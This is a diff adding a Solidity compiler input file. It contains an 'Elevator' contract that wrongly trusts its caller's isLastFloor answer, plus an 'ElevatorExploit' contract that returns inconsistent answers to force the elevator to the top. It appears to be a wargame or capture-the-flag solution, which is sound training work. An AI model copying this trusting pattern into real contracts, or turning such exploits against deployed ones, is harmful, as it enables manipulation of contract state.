@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/Elevator.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Building {\n    function isLastFloor(uint) external returns (bool);\n}\n\ncontract Elevator {\n    bool public top;\n    uint public floor;\n\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n\n        if (!building.isLastFloor(_floor)) {\n            floor = _floor;\n            top = building.isLastFloor(floor);\n        }\n    }\n}\n\ncontract ElevatorExploit {\n    Elevator private elevator;\n    uint ctr;\n\n    constructor(address _elevator) {\n        elevator = Elevator(_elevator);\n    }\n\n    function isLastFloor(uint) external returns (bool) {\n        ctr++;\n        if (ctr > 1) return true;\n        return false;\n    }\n\n    function changeFloor(uint _floor) external {\n        elevator.goTo(_floor);\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
